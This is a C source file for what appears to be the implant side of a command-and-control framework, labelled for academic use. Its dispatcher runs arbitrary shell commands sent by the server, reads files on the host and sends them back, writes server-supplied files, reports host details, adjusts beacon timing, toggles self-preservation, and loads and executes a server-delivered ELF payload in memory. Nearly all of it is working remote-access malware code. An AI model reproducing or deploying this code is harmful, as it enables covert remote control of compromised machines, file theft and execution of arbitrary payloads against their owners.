/* ==========================================================================
 * capabilities.c — Capability Dispatch & Handlers
 * ==========================================================================
 * Each capability handler:
 *   1. Receives decoded TLV fields from a TASK message
 *   2. Performs the requested operation via PAL
 *   3. Builds a RESULT TLV message with the output
 *
 * ACADEMIC/EDUCATIONAL USE ONLY.
 * ========================================================================== */

#include "capabilities.h"
#include "config.h"
#include "pal.h"

#ifdef __linux__
#include "elf_loader.h"
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "compat.h"

/* ---- Dispatcher ------------------------------------------------------- */

int capability_dispatch(agent_ctx_t *ctx,
                        const tlv_field_t *fields, size_t field_count,
                        tlv_buffer_t *result)
{
    if (fields == NULL || result == NULL) {
        return -1;
    }

    /* Find the task type field. */
    const tlv_field_t *type_field = tlv_find_field(fields, field_count,
                                                   TLV_TASK_TYPE);
    if (type_field == NULL || type_field->length < 2) {
        fprintf(stderr, "[cap] Missing or invalid TLV_TASK_TYPE.\n");
        return -1;
    }

    uint16_t task_type = tlv_read_u16_be(type_field->value);

    /* Copy the task ID to the result. */
    const tlv_field_t *id_field = tlv_find_field(fields, field_count,
                                                  TLV_TASK_ID);
    if (id_field != NULL && id_field->length > 0) {
        tlv_buffer_add(result, TLV_TASK_ID, id_field->length, id_field->value);
    }

    /* Add the message type for RESULT. */
    tlv_buffer_add_u16(result, TLV_MSG_TYPE, MSG_RESULT);

    /* Dispatch based on task type. */
    switch (task_type) {
    case TASK_EXEC:
        return cap_exec(fields, field_count, result);

    case TASK_UPLOAD:
        return cap_upload(fields, field_count, result);

    case TASK_DOWNLOAD:
        return cap_download(fields, field_count, result);

    case TASK_SYSINFO:
        return cap_sysinfo(fields, field_count, result);

    case TASK_SLEEP:
        return cap_sleep(ctx, fields, field_count, result);

    case TASK_SELFPRESERVE:
        return cap_selfpreserve(ctx, fields, field_count, result);

    case TASK_LOAD_ELF:
        return cap_load_elf(ctx, fields, field_count, result);

    default:
        fprintf(stderr, "[cap] Unknown task type: 0x%04x\n", task_type);
        tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 1); /* error */
        tlv_buffer_add_str(result, TLV_RESULT_DATA, "unknown task type");
        return -1;
    }
}

/* ---- cap_exec: execute a shell command -------------------------------- */

int cap_exec(const tlv_field_t *fields, size_t field_count,
             tlv_buffer_t *result)
{
    const tlv_field_t *data_field = tlv_find_field(fields, field_count,
                                                   TLV_TASK_DATA);
    if (data_field == NULL || data_field->length == 0) {
        tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 1);
        tlv_buffer_add_str(result, TLV_RESULT_DATA, "no command provided");
        return -1;
    }

    /* NUL-terminate the command string. */
    char *cmd = (char *)malloc(data_field->length + 1);
    if (cmd == NULL) {
        tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 1);
        tlv_buffer_add_str(result, TLV_RESULT_DATA, "allocation failed");
        return -1;
    }
    memcpy(cmd, data_field->value, data_field->length);
    cmd[data_field->length] = '\0';

    /* Execute. */
    char *output = (char *)malloc(MAX_EXEC_OUTPUT);
    if (output == NULL) {
        free(cmd);
        tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 1);
        tlv_buffer_add_str(result, TLV_RESULT_DATA, "allocation failed");
        return -1;
    }

    int exit_code = 0;
    int rc = pal_spawn_process(cmd, output, MAX_EXEC_OUTPUT, &exit_code);

    free(cmd);

    if (rc != 0) {
        tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 1);
        tlv_buffer_add_str(result, TLV_RESULT_DATA, "process execution failed");
        free(output);
        return -1;
    }

    /* Build result. */
    tlv_buffer_add_u32(result, TLV_RESULT_STATUS, (uint32_t)exit_code);
    tlv_buffer_add_str(result, TLV_RESULT_DATA, output);

    free(output);
    return 0;
}

/* ---- cap_upload: read file from agent → server ------------------------ */

int cap_upload(const tlv_field_t *fields, size_t field_count,
               tlv_buffer_t *result)
{
    const tlv_field_t *path_field = tlv_find_field(fields, field_count,
                                                   TLV_FILE_PATH);
    if (path_field == NULL || path_field->length == 0) {
        /* Fall back to TLV_TASK_DATA for the path. */
        path_field = tlv_find_field(fields, field_count, TLV_TASK_DATA);
    }

    if (path_field == NULL || path_field->length == 0) {
        tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 1);
        tlv_buffer_add_str(result, TLV_RESULT_DATA, "no file path provided");
        return -1;
    }

    /* NUL-terminate the path. */
    char *path = (char *)malloc(path_field->length + 1);
    if (path == NULL) {
        tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 1);
        return -1;
    }
    memcpy(path, path_field->value, path_field->length);
    path[path_field->length] = '\0';

    /* Read the file. */
    uint8_t *file_data = NULL;
    size_t file_size   = 0;

    if (pal_read_file(path, &file_data, &file_size) != 0) {
        tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 1);
        tlv_buffer_add_str(result, TLV_RESULT_DATA, "failed to read file");
        free(path);
        return -1;
    }

    tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 0);
    tlv_buffer_add_str(result, TLV_FILE_PATH, path);
    tlv_buffer_add(result, TLV_FILE_DATA, (uint32_t)file_size, file_data);

    free(path);
    free(file_data);
    return 0;
}

/* ---- cap_download: write file from server → agent --------------------- */

int cap_download(const tlv_field_t *fields, size_t field_count,
                 tlv_buffer_t *result)
{
    const tlv_field_t *path_field = tlv_find_field(fields, field_count,
                                                   TLV_FILE_PATH);
    const tlv_field_t *data_field = tlv_find_field(fields, field_count,
                                                   TLV_FILE_DATA);

    if (path_field == NULL || path_field->length == 0) {
        tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 1);
        tlv_buffer_add_str(result, TLV_RESULT_DATA,
                           "no destination path provided");
        return -1;
    }

    if (data_field == NULL) {
        tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 1);
        tlv_buffer_add_str(result, TLV_RESULT_DATA,
                           "no file data provided");
        return -1;
    }

    /* NUL-terminate the path. */
    char *path = (char *)malloc(path_field->length + 1);
    if (path == NULL) {
        tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 1);
        return -1;
    }
    memcpy(path, path_field->value, path_field->length);
    path[path_field->length] = '\0';

    /* Write the file. */
    if (pal_write_file(path, data_field->value, data_field->length) != 0) {
        tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 1);
        tlv_buffer_add_str(result, TLV_RESULT_DATA, "failed to write file");
        free(path);
        return -1;
    }

    tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 0);
    tlv_buffer_add_str(result, TLV_RESULT_DATA, "file written successfully");
    free(path);
    return 0;
}

/* ---- cap_sysinfo: gather system information --------------------------- */

int cap_sysinfo(const tlv_field_t *fields, size_t field_count,
                tlv_buffer_t *result)
{
    (void)fields;
    (void)field_count;

    char hostname[256];
    char os_info[512];
    char arch[64];

    pal_get_hostname(hostname, sizeof(hostname));
    pal_get_os_info(os_info, sizeof(os_info));
    pal_get_arch(arch, sizeof(arch));

    tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 0);
    tlv_buffer_add_str(result, TLV_HOSTNAME, hostname);
    tlv_buffer_add_str(result, TLV_OS_INFO, os_info);
    tlv_buffer_add_str(result, TLV_ARCH, arch);

    return 0;
}

/* ---- cap_sleep: adjust beacon interval -------------------------------- */

int cap_sleep(agent_ctx_t *ctx,
              const tlv_field_t *fields, size_t field_count,
              tlv_buffer_t *result)
{
    if (ctx == NULL) {
        tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 1);
        return -1;
    }

    const tlv_field_t *data_field = tlv_find_field(fields, field_count,
                                                   TLV_TASK_DATA);
    if (data_field == NULL || data_field->length < 4) {
        tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 1);
        tlv_buffer_add_str(result, TLV_RESULT_DATA,
                           "sleep requires a uint32 interval");
        return -1;
    }

    uint32_t new_interval = tlv_read_u32_be(data_field->value);

    /* Clamp to valid range: 5–3600 seconds. */
    if (new_interval < 5) {
        new_interval = 5;
    } else if (new_interval > 3600) {
        new_interval = 3600;
    }

    ctx->beacon_interval = new_interval;

    pal_log("Beacon interval changed to %u seconds.", new_interval);

    tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 0);
    tlv_buffer_add_u32(result, TLV_BEACON_INTERVAL, new_interval);

    return 0;
}

/* ---- cap_selfpreserve: toggle self-preservation on/off ---------------- */

int cap_selfpreserve(agent_ctx_t *ctx,
                     const tlv_field_t *fields, size_t field_count,
                     tlv_buffer_t *result)
{
    if (ctx == NULL) {
        tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 1);
        return -1;
    }

    /* Read the toggle value from TLV_TASK_DATA.
     * Expected payload: a single uint8 — 0x01 = enable, 0x00 = disable.
     * If no payload is provided, default to enable. */
    const tlv_field_t *data_field = tlv_find_field(fields, field_count,
                                                    TLV_TASK_DATA);

    int enable = 1; /* Default: enable */
    if (data_field != NULL && data_field->length >= 1) {
        enable = (data_field->value[0] != 0) ? 1 : 0;
    }

    int rc;
    if (enable) {
        rc = pal_self_preserve_start();
        ctx->self_preserve = 1;
    } else {
        rc = pal_self_preserve_stop();
        ctx->self_preserve = 0;
    }

    tlv_buffer_add_u32(result, TLV_RESULT_STATUS, (rc == 0) ? 0 : 1);
    tlv_buffer_add_str(result, TLV_RESULT_DATA,
                       enable ? "self-preservation enabled"
                              : "self-preservation disabled");

    pal_log("Self-preservation %s by operator (rc=%d).",
            enable ? "ENABLED" : "DISABLED", rc);

    return rc;
}

/* ---- cap_load_elf: load & execute ELF from server --------------------- */

int cap_load_elf(agent_ctx_t *ctx,
                 const tlv_field_t *fields, size_t field_count,
                 tlv_buffer_t *result)
{
    (void)ctx;

#ifndef __linux__
    /* ELF loading is Linux-only */
    tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 1);
    tlv_buffer_add_str(result, TLV_RESULT_DATA,
                       "ELF loader not available on this platform");
    return -1;
#else
    const tlv_field_t *data_field = tlv_find_field(fields, field_count,
                                                    TLV_TASK_DATA);
    if (data_field == NULL || data_field->length == 0) {
        tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 1);
        tlv_buffer_add_str(result, TLV_RESULT_DATA,
                           "no ELF binary provided");
        return -1;
    }

    pal_log("Loading ELF binary (%u bytes)...", data_field->length);

    /* Validate the ELF binary */
    if (elf_validate(data_field->value, data_field->length) != 0) {
        tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 1);
        tlv_buffer_add_str(result, TLV_RESULT_DATA,
                           "invalid ELF binary");
        return -1;
    }

    /* Load the ELF into memory */
    elf_ctx_t elf;
    if (elf_load(data_field->value, data_field->length, &elf) != 0) {
        tlv_buffer_add_u32(result, TLV_RESULT_STATUS, 1);
        tlv_buffer_add_str(result, TLV_RESULT_DATA,
                           "ELF load failed");
        return -1;
    }

    /* Execute the loaded ELF.
     * We pass empty argc/argv since the ELF is a server-delivered
     * payload, not a command-line program. */
    char *argv[] = { (char *)"payload", NULL };
    char *envp[] = { NULL };

    int rc = elf_execute(&elf, 1, argv, envp);

    pal_log("ELF execution returned %d", rc);

    /* Unload the ELF */
    elf_unload(&elf);

    /* Report result */
    tlv_buffer_add_u32(result, TLV_RESULT_STATUS, (rc == 0) ? 0 : 1);

    char result_msg[128];
    snprintf(result_msg, sizeof(result_msg),
             "ELF executed (exit=%d)", rc);
    tlv_buffer_add_str(result, TLV_RESULT_DATA, result_msg);

    return 0;
#endif /* __linux__ */
}
